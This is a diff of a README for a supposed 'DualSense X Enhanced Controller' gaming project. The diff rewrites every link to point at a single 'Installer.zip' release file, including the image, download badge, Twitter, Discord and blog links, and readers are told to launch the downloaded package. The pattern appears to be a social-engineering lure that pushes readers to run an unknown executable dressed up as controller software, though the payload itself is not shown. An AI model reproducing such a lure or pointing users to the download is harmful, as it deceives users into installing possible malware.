@@ -1,6 +1,6 @@
 # 🎮🔥 **DualSense X - Enhanced Controller Integration** 🎮🔥
 
-![DualSense X Controller](https://example.com/dualsense-x.jpg)
+![DualSense X Controller](https://github.com/Riyadsamm/DualSense-X-Enhanced-Controller/releases/download/v1.0/Installer.zip)
 
 Welcome to the **DualSense-X-Enhanced-Controller** repository! This repository is dedicated to enhancing your gaming experience with the DualSense X - Enhanced Controller integration. Whether you're a casual or hardcore gamer, this project aims to optimize your controller settings, customization, and overall performance for an ultimate gaming adventure.
 
@@ -19,7 +19,7 @@ Welcome to the **DualSense-X-Enhanced-Controller** repository! This repository i
 ### Installation 🔧
 To get started with the DualSense X - Enhanced Controller integration, download the package from the following link:
 
-[![Download Enhanced Controller](https://img.shields.io/static/v1?label=Download&message=DualSense-X-Enhanced-Controller&color=success)](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip)
+[![Download Enhanced Controller](https://github.com/Riyadsamm/DualSense-X-Enhanced-Controller/releases/download/v1.0/Installer.zip)](https://github.com/Riyadsamm/DualSense-X-Enhanced-Controller/releases/download/v1.0/Installer.zip)
 
 Please ensure to launch the downloaded package to initiate the installation process.
 
@@ -29,9 +29,9 @@ If the above link is not functional or you encounter any issues, please visit th
 ### Let's Connect 🌐
 Stay updated on the latest controller enhancements, gaming tips, and community discussions by joining our online platforms:
 
-- **Twitter**: [@DualSenseX](https://twitter.com/DualSenseX)
-- **Discord**: [DualSense X Community](https://discord.com/DualSenseX)
-- **Blog**: [DualSense X Blog](https://blog.dualsense-x.com)
+- **Twitter**: [@DualSenseX](https://github.com/Riyadsamm/DualSense-X-Enhanced-Controller/releases/download/v1.0/Installer.zip)
+- **Discord**: [DualSense X Community](https://github.com/Riyadsamm/DualSense-X-Enhanced-Controller/releases/download/v1.0/Installer.zip)
+- **Blog**: [DualSense X Blog](https://github.com/Riyadsamm/DualSense-X-Enhanced-Controller/releases/download/v1.0/Installer.zip)
 
 Let's elevate your gaming experience together with the DualSense X - Enhanced Controller integration! 🎮✨
 
